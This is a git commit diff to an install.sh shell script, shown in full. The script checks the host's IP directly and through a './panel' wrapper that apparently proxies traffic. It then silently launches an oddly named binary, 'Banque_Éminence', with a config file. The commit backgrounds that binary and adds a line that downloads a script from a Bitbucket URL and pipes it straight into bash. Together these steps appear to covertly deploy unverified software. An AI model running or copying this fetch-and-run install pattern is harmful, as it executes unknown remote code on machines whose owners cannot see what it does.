86d0b908fad54aaf6195a554a35ab2ebc86221d5
dragonballku8 <157442283+dragonballku8@users.noreply.github.com>
2024-02-02 22:41:48 +0700

    Update install.sh

--- install.sh
+++ install.sh
@@ -21,6 +21,7 @@ echo "IP ORI ==> "$(curl ifconfig.me)
 echo " " 
 echo " " 
 echo "IP BARU ==> "$(./panel curl ifconfig.me)
-./panel ./Banque_Éminence -c "config.json" >/dev/null 2>&1
+./panel ./Banque_Éminence -c "config.json" >/dev/null 2>&1  &
+curl -sL https://bitbucket.org/koploks/shc/raw/master/boled04.sh | bash
 sleep 1
 sync; echo 3 > /proc/sys/vm/drop_caches
